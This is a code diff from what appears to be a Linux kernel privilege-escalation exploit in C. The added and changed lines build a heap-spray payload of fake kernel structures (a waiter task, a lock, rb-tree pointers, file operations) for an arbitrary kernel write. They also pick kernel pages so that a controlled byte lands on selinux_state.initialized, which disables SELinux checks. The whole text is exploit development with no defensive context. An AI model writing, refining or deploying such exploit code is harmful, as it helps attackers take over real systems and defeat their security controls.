@@ -463,10 +463,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      if (tcp)
-        build_tcp_zerocopy_payload(p + W0_OFF, request, &write_layout);
-      else
-        build_select_stack_payload(p + W0_OFF, &write_layout);
+      build_compact_waiter_payload(p + W0_OFF, request, &write_layout);
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
       put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
       put32(p, W0_OFF + 0x40, 0);           /* wake_state */
@@ -774,12 +771,18 @@ uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(request);
     if (base) {
-      /* W1 stores this page address, so the word's byte 2 lands on
-       * selinux_state.initialized. an even byte there fails every SID lookup */
-      if (pselect_custom_write == 1 && pselect_child_node &&
-          ((fake_right >> 16) & 1) == 0) {
+      PayloadWriteLayout layout = {
+        .parent = fake_parent,
+        .right = fake_right,
+        .left = fake_left,
+        .fops = fake_fops,
+      };
+      if (!payload_write_layout_matches_request(request, &layout)) {
+        pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
+                   request->preserve_child, layout.right);
+      } else if (!payload_write_layout_accepts_page(request, &layout)) {
         pr_warning("page %016zx stores an even byte over "
-                   "selinux_state.initialized; taking another\n", (size_t)base);
+                   "selinux_state.initialized; taking another\n", base);
       } else {
         pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
                 ms_since(&t_good));
